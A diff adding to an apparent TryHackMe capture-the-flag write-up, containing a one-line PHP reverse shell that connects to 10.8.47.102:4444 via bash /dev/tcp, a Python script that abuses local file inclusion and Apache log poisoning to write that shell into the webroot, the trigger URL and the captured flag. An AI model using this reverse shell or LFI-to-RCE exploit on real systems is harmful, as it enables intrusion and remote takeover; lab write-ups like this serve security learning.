@@ -607,17 +607,48 @@ http://10.10.106.210/test.php
 
 <img width="1344" height="805" alt="image" src="https://github.com/user-attachments/assets/697cead6-46d9-4887-ba7e-ff11a090389a" />
 
+``shell_php.php``
+
+```
+<?php exec('/bin/bash -c "bash -i >& /dev/tcp/10.8.47.102/4444 0>&1"'); ?>
+```
+
+``shell.py``
+
+```py
+#!/usr/bin/env python3
+import requests, base64, os, sys
+
+url = "http://10.10.106.210/"                
+local = "shell_php.php"                         
+
+b64 = base64.b64encode(open(local,"rb").read()).decode()   # نقرأ الملف ونشفّره Base64
+cmd = f"echo {b64} | base64 -d > /var/www/html/shell.php"   # أمر لفك الشيفرة وكتابة الملف في webroot
+r = requests.get(url, params={
+    "view":"dog/../../../../../../var/log/apache2/access.log",
+    "ext":"",
+    "c":cmd
+}, timeout=15)
+
+print("HTTP", r.status_code)
+
+```
 
 
 
 
 
+## get the shell (LFI 2 RCE)
 
+```
+http://10.10.106.210/shell.php
+```
 
+<img width="975" height="624" alt="image" src="https://github.com/user-attachments/assets/32453bd7-58b9-4ab2-8d14-a1f2eedfd57d" />
 
-
-
-
+```
+THM{LF1_t0_RC3_aec3fb}
+```
 
 
 
